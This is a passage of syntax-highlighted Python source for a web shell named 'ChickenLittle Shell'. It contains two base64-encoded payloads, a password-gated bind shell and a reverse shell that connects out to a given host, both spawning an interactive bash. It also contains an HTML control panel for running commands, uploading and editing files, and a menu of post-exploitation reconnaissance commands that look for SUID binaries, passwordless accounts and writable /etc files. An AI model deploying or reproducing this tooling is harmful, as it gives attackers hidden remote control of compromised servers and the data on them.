&lt;span class="n"&gt;bind_port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;aW1wb3J0IG9zLCBzeXMsIHNvY2tldCwgdGltZQpQT1JUID0gaW50KHN5cy5hcmd2WzFdKQpQVyA9&lt;/span&gt;
&lt;span class="s2"&gt;IHN5cy5hcmd2WzJdCnNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5T&lt;/span&gt;
&lt;span class="s2"&gt;T0NLX1NUUkVBTSkKc29jay5iaW5kKCgiMC4wLjAuMCIsUE9SVCkpCnNvY2subGlzdGVuKDUpClNI&lt;/span&gt;
&lt;span class="s2"&gt;RUxMPSIvYmluL2Jhc2ggLWkiCndoaWxlIFRydWU6CiAgICB0cnk6CQogICAgICAgIChjb25uLGFk&lt;/span&gt;
&lt;span class="s2"&gt;ZHIpID0gc29jay5hY2NlcHQoKQogICAgICAgIG9zLmR1cDIoY29ubi5maWxlbm8oKSwwKQogICAg&lt;/span&gt;
&lt;span class="s2"&gt;ICAgIG9zLmR1cDIoY29ubi5maWxlbm8oKSwxKQogICAgICAgIG9zLmR1cDIoY29ubi5maWxlbm8o&lt;/span&gt;
&lt;span class="s2"&gt;KSwyKQogICAgICAgIHByaW50ID4+IHN5cy5zdGRlcnIsICdQYXNzd29yZDogJywKICAgICAgICBw&lt;/span&gt;
&lt;span class="s2"&gt;ID0gY29ubi5yZWN2KDEwMjQpCiAgICAgICAgcCA9IHAuc3RyaXAoKQogICAgICAgIGlmIHAgPT0g&lt;/span&gt;
&lt;span class="s2"&gt;UFc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiL2Jpbi9iYXNoIC1pIikKICAgICAgICBlbHNlOgog&lt;/span&gt;
&lt;span class="s2"&gt;ICAgICAgICAgICBwcmludCA+PiBzeXMuc3RkZXJyLCAiR28gdG8gaGVsbCIKICAgICAgICBjb25u&lt;/span&gt;
&lt;span class="s2"&gt;LmNsb3NlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24sZTogIAogICAgICAgIHByaW50IGUKICAgICAg&lt;/span&gt;
&lt;span class="s2"&gt;ICB0aW1lLnNsZWVwKDEpCg==&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;back_connect&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;aW1wb3J0IHNvY2tldCwgb3MsIHN5cwpIT1NUID0gc3lzLmFyZ3ZbMV0KUE9SVCA9IGludChzeXMu&lt;/span&gt;
&lt;span class="s2"&gt;YXJndlsyXSkKU0hFTEwgPSAiL2Jpbi9iYXNoIC1pIgpzb2NrID0gc29ja2V0LnNvY2tldChzb2Nr&lt;/span&gt;
&lt;span class="s2"&gt;ZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnNvY2suY29ubmVjdCgoSE9TVCxQT1JUKSkK&lt;/span&gt;
&lt;span class="s2"&gt;dHJ5OgogICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAwKQogICAgb3MuZHVwMihzb2NrLmZpbGVu&lt;/span&gt;
&lt;span class="s2"&gt;bygpLCAxKQogICAgb3MuZHVwMihzb2NrLmZpbGVubygpLCAyKQogICAgb3Muc3lzdGVtKFNIRUxM&lt;/span&gt;
&lt;span class="s2"&gt;KQpleGNlcHQgRXhjZXB0aW9uLGU6CiAgICBwcmludCBlCnNvY2suY2xvc2UoKQo=&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="c1"&gt;# HTML&lt;/span&gt;

&lt;span class="n"&gt;html&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;title&amp;gt;ChickenLittle Shell&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=UTF-8&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;style&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        body {&lt;/span&gt;
&lt;span class="s2"&gt;            color:#fff;&lt;/span&gt;
&lt;span class="s2"&gt;            background-color:#585858;&lt;/span&gt;
&lt;span class="s2"&gt;            font-size:11px;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;        table {&lt;/span&gt;
&lt;span class="s2"&gt;            font-family: Verdana, Tahoma;&lt;/span&gt;
&lt;span class="s2"&gt;            font-size:11px;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;        tr {&lt;/span&gt;
&lt;span class="s2"&gt;            border: #D9D9D9 1px solid;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;        td {&lt;/span&gt;
&lt;span class="s2"&gt;            border: #D9D9D9 1px solid;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;        a {&lt;/span&gt;
&lt;span class="s2"&gt;            color: #fff;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;        input {&lt;/span&gt;
&lt;span class="s2"&gt;            background-color:#800000;&lt;/span&gt;
&lt;span class="s2"&gt;            color:#FFFFFF;&lt;/span&gt;
&lt;span class="s2"&gt;            font-family:Tahoma;&lt;/span&gt;
&lt;span class="s2"&gt;            font-size:8pt;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;        select {&lt;/span&gt;
&lt;span class="s2"&gt;            background-color:#800000;&lt;/span&gt;
&lt;span class="s2"&gt;            color:#FFFFFF;&lt;/span&gt;
&lt;span class="s2"&gt;            font-family:Tahoma;&lt;/span&gt;
&lt;span class="s2"&gt;            font-size:8pt;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;        textarea {&lt;/span&gt;
&lt;span class="s2"&gt;            background-color:#800000;&lt;/span&gt;
&lt;span class="s2"&gt;            color:#FFFFFF;&lt;/span&gt;
&lt;span class="s2"&gt;            font-family:Tahoma;&lt;/span&gt;
&lt;span class="s2"&gt;            font-size:8pt;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/style&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        function toggleEnviron()&lt;/span&gt;
&lt;span class="s2"&gt;        {&lt;/span&gt;
&lt;span class="s2"&gt;            if (document.getElementById(&amp;#39;environ_table&amp;#39;).style.display==&amp;quot;none&amp;quot;)&lt;/span&gt;
&lt;span class="s2"&gt;                document.getElementById(&amp;#39;environ_table&amp;#39;).style.display=&amp;quot;&amp;quot;;&lt;/span&gt;
&lt;span class="s2"&gt;            else&lt;/span&gt;
&lt;span class="s2"&gt;                document.getElementById(&amp;#39;environ_table&amp;#39;).style.display=&amp;quot;none&amp;quot;;&lt;/span&gt;
&lt;span class="s2"&gt;        }&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;=== ChickenLittle Shell ===&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;a href=&amp;quot;javascript:void(0)&amp;quot; onclick=&amp;quot;javascript:toggleEnviron()&amp;quot;&amp;gt;Show/Hide Environment variables&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    $environ_table&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            uname -a: $uname &amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            $uid&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;div style=&amp;quot;display:$edit_file_box_visibility&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;b&amp;gt;Edit File:&amp;lt;/b&amp;gt; &amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;?&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;textarea name=&amp;quot;file_content&amp;quot; cols=&amp;quot;200&amp;quot; rows=&amp;quot;30&amp;quot; &amp;gt;$file_content&amp;lt;/textarea&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot; /&amp;gt; &amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;save_file&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;command&amp;quot; /&amp;gt; &amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$file_name&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;file_name&amp;quot; /&amp;gt; &amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Save&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Change Dir ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot;&amp;gt;&amp;amp;nbsp;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Go&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Get File ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot;&amp;gt;&amp;amp;nbsp;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Go&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td colspan=&amp;quot;2&amp;quot; style=&amp;quot;text-align:center&amp;quot;&amp;gt;&amp;lt;b&amp;gt;$cur_dir&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td&amp;gt;&amp;lt;pre&amp;gt;$list_files&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;b&amp;gt;Result of command&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;textarea cols=&amp;quot;200&amp;quot; rows=&amp;quot;10&amp;quot;&amp;gt;$command_result&amp;lt;/textarea&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot; width=&amp;quot;50%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Execute Command ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;command&amp;quot;&amp;gt;&amp;amp;nbsp;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Execute&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Useful Commands ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;select name=&amp;quot;command&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;uname -a&amp;quot;&amp;gt;Kernel version&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;w&amp;quot;&amp;gt;Logged in users&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;lastlog&amp;quot;&amp;gt;Last to connect&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2&amp;gt; /dev/null&amp;quot;&amp;gt;Suid bins&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;cut -d: -f1,2,3 /etc/passwd | grep ::&amp;quot;&amp;gt;USER WITHOUT PASSWORD!&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;find /etc/ -type f -perm -o+w 2&amp;gt; /dev/null&amp;quot;&amp;gt;Write in /etc/?&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;which wget curl w3m lynx&amp;quot;&amp;gt;Downloaders?&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;cat /proc/version /proc/cpuinfo&amp;quot;&amp;gt;CPUINFO&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;netstat -atup | grep IST&amp;quot;&amp;gt;Open ports&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;option value=&amp;quot;locate gcc&amp;quot;&amp;gt;gcc installed?&amp;lt;/option&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;/select&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Go&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot; width=&amp;quot;50%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Create Dir ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;new_dir&amp;quot;&amp;gt;&amp;amp;nbsp;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Create&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;mkdir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;command&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Upload File ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot;&amp;gt;&amp;amp;nbsp;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;upload&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;command&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;p /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center&amp;quot; width=&amp;quot;50%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Search Text in Files ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;table width=&amp;quot;100%&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td width=&amp;quot;50%&amp;quot; style=&amp;quot;border:none;text-align:right&amp;quot;&amp;gt;Text: &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot; size=&amp;quot;30&amp;quot; name=&amp;quot;search_text&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                             &amp;lt;td width=&amp;quot;50%&amp;quot; style=&amp;quot;border:none;text-align:right&amp;quot;&amp;gt;Directory: &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;30&amp;quot; name=&amp;quot;search_dir&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                             &amp;lt;td width=&amp;quot;50%&amp;quot; style=&amp;quot;border:none;text-align:right&amp;quot;&amp;gt;Include File Pattern: &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot; size=&amp;quot;30&amp;quot; name=&amp;quot;include_pattern&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                             &amp;lt;td width=&amp;quot;50%&amp;quot; style=&amp;quot;border:none;text-align:right&amp;quot;&amp;gt;Exclude File Pattern: &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                            &amp;lt;td style=&amp;quot;border:none&amp;quot;&amp;gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;&amp;quot; size=&amp;quot;30&amp;quot; name=&amp;quot;exclude_pattern&amp;quot; /&amp;gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;/table&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Search&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;search_text&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;command&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;td style=&amp;quot;text-align:center;vertical-align:top&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;b&amp;gt;:: Edit File ::&amp;lt;/b&amp;gt;&amp;lt;br /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;form action=&amp;quot;?&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;cur_dir&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;hidden&amp;quot; value=&amp;quot;edit_file&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;command&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;$cur_dir&amp;quot; size=&amp;quot;50&amp;quot; name=&amp;quot;file_name&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                    &amp;amp;nbsp;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Edit&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;            &amp;lt;/td&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;        &amp;lt;/tr&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;    &amp;lt;/table&amp;gt;&lt;/span&gt;
